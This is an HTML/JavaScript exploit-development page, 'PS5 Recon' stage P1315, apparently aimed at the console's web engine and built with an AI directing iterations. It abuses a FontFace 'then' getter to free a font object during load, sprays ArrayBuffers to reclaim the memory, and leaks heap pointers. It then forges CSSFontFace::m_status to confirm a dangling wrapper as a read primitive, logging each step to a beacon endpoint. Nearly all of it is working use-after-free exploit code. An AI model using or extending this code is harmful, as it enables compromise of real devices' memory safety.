<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 17px/1.3 ui-monospace,monospace;padding:15px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#sub{position:fixed;top:68px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
#log{margin:100px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:74vh;overflow:auto}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
.r.warn .t{color:var(--amber)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">starting…</div>
<div id="sub">P1315 — capture load-resolved FontFace wrappers → forge m_status → read it back (hunt a dangling wrapper)</div>
<div id="log"></div>
<script>
'use strict';
window.PTAG='P1315';
var LOG=document.getElementById('log'),BN=document.getElementById('bn');
var _ctr=0;
function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
function cls(s){var z=(''+s).toLowerCase();
  if(/win|dangling|readback-ok|reflects/.test(z))return 'win';
  if(/hit|ok\b|captured/.test(z))return 'ok';
  if(/err|fail|crash|fatal|miss|nospray|timeout|cap|no-dangle|no-cand/.test(z))return 'bad';
  if(/stale|none|retry/.test(z))return 'warn';return '';}
function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
  LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
function B(tag,data){
  var c=cls(tag+' '+(data||''));row(tag,data,c);
  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
    var u='/beacon.php?tag=P1315-'+encodeURIComponent(tag);
    if(data)u+='&data='+encodeURIComponent(s);
    u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};

(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}

var leaked={L1:null,L2:null,buf:null};
window.__tf=null; window.__lf=null;

var RC=0;try{RC=parseInt(sessionStorage.getItem('p1315_rc')||'0',10)||0;}catch(e){}
function reloadOnce(){
  if(leaked.buf)return;
  if(RC>=3){B('NOLEAK-CAP','3 misses this open — CLOSE+REOPEN for fresh memory');S('no leak x3 — close+reopen the browser','#4a2a12');return;}
  try{sessionStorage.setItem('p1315_rc',String(RC+1));}catch(e){}
  setTimeout(function(){location.reload();},400);
}

/* ═══ STAGE 1 — proven leak, but CAPTURE every FontFace wrapper we can reach ═══ */
var K=32,SIZE=192,fired=false;
S('STAGE 1 — proven leak + wrapper capture…','#13233a');
window.__sp=[];
var fs=null;
try{
  var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(vf); void vf.loaded;
  fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
}catch(e){B('S1-SETUP-ERR',(''+e).slice(0,50));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,
  get:function(){
    if(fired)return undefined;fired=true;
    try{window.__tf=this;}catch(e){}        /* capture the wrapper the engine is resolving */
    try{if(fs){fs.textContent='';fs.remove();}}catch(e){}
    try{document.fonts.delete(this);}catch(e){}
    fs=null;
    try{document.body.offsetHeight;}catch(e){}
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
B('S1-SETUP','K=32 + capture armed');
try{
  document.fonts.load('1em vf, v1','AB').then(
    function(faces){window.__lf=faces;B('S1-RES','n'+(faces&&faces.length));setTimeout(leScan,80);},
    function(e){B('S1-RJ',''+(e&&e.name));setTimeout(leScan,80);});
}catch(e){B('S1-LOADERR',(''+e).slice(0,40));}
setTimeout(function(){ if(leaked.buf)return; if(!window.__sp||!window.__sp.length){B('S1-NOSPRAY','getter never fired');reloadOnce();} },1500);
setTimeout(function(){ if(!leaked.buf){leScan();} },700);

function leScan(){
  if(leaked.buf)return;
  var sp=window.__sp||[],hit=-1;
  for(var i=0;i<sp.length;i++){
    var a=le(sp[i],0x58);
    if(a>0x1000000000n&&a<0x8000000000n){leaked.L1=a;leaked.L2=le(sp[i],0x68);leaked.buf=sp[i];hit=i;break;}
  }
  if(hit<0){B('S1-MISS','no reclaim');reloadOnce();return;}
  B('S1-HIT','L1=0x'+leaked.L1.toString(16)+' L2=0x'+leaked.L2.toString(16)+' k'+hit);
  S('LEAK OK — testing captured wrappers…','#0c7a3a');
  setTimeout(stage2,150);
}

/* ═══ STAGE 2 — is any reachable wrapper backed by OUR buffer? ═══
   FontFace.status reads CSSFontFace::m_status (inline uint8 @ 0x82) → maps to a string.
   Map: Pending→unloaded, Loading→loading, Success→loaded, Failure→error.
   Forge m_status=4 (Failure→"error"); if a captured wrapper's .status flips to "error",
   its backing IS our reclaimed buffer ⇒ dangling wrapper ⇒ read primitive. */
function readStatus(w){try{return ''+w.status;}catch(e){return 'ERR:'+(e.name||'e');}}
function stage2(){
  if(window.__s2)return;window.__s2=true;
  S('STAGE 2 — dangling-wrapper test','#13233a');
  var buf=leaked.buf;

  var cands=[];
  if(window.__tf){cands.push(['this',window.__tf]);}
  if(window.__lf&&window.__lf.length){for(var i=0;i<window.__lf.length;i++)cands.push(['lf'+i,window.__lf[i]]);}
  /* also try document.fonts members (usually 0, but cheap) */
  try{document.fonts.forEach(function(f){cands.push(['set',f]);});}catch(e){}

  if(!cands.length){B('S2-NO-CAND','no wrapper references captured');S('no wrappers captured — tell AI','#4a2a12');finish();return;}

  /* baseline statuses */
  var base=[];
  for(var i=0;i<cands.length;i++)base.push(readStatus(cands[i][1]));
  B('S2-BASE','n='+cands.length+'|'+cands.map(function(c,i){return c[0]+'='+base[i];}).join(' , '));

  /* forge distinctive m_status = 4 (Failure -> "error") */
  buf[0x82]=4;

  var hit=false,after=[];
  for(var i=0;i<cands.length;i++){
    var st=readStatus(cands[i][1]);
    after.push(cands[i][0]+'='+st);
    if(st==='error'&&base[i]!=='error'){
      hit=true;
      B('DANGLING-WRAPPER','WIN '+cands[i][0]+' .status flipped unloaded/loaded->error — backed by OUR buffer!');
      S('DANGLING WRAPPER FOUND !!! tell AI','#0a7a2a');
    }
  }
  B('S2-AFTER',after.join(' , '));

  /* cross-check: set m_status=1 (loading) and confirm it flips back on the same candidate */
  if(hit){
    buf[0x82]=1;
    var confirm=[];
    for(var i=0;i<cands.length;i++)confirm.push(cands[i][0]+'='+readStatus(cands[i][1]));
    B('S2-CONFIRM-loading',confirm.join(' , '));
  }

  if(!hit)B('S2-NO-DANGLE','no captured wrapper reflects our m_status — backing not reclaimed (no refcount UAF here)');
  finish();
}
function finish(){
  if(window.__fin)return;window.__fin=true;
  B('DONE','p1315');
  S('P1315 COMPLETE — press the run button, I\'ll aggregate','#1b2330');
}
</script>
</body></html>
